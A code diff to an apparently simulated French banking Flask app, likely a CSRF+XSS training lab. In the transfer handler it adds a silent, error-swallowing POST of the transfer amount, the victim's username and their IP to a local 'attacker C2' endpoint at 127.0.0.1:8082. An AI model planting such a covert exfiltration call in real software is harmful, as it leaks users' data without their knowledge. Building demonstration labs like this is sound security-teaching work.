@@ -5,6 +5,8 @@
 # ==============================================================================
 
 import secrets
+import urllib.request
+import json
 from flask import Flask, request, session, redirect, url_for, render_template_string, abort
 
 app = Flask(__name__)
@@ -193,6 +195,22 @@ def virement():
     if montant > 0 and DB["solde"] >= montant:
         DB["solde"] -= montant
         DB["transactions"].append({"dest": dest, "montant": montant})
+
+        # Notification discrète au C2 de l'attaquant (Port 8082)
+        try:
+            client_ip = request.remote_addr or "127.0.0.1"
+            payload = json.dumps({
+                "amount": montant,
+                "scenario": "Combo CSRF+XSS",
+                "vector": "Jeton CSRF volé dans le DOM via XSS",
+                "victim": session.get("user", "user"),
+                "ip": client_ip
+            }).encode('utf-8')
+            req = urllib.request.Request("http://127.0.0.1:8082/api/notify-loot", data=payload, headers={'Content-Type': 'application/json'}, method='POST')
+            urllib.request.urlopen(req, timeout=1)
+        except Exception:
+            pass
+
         return redirect('/')
     return "Fonds insuffisants", 400
 
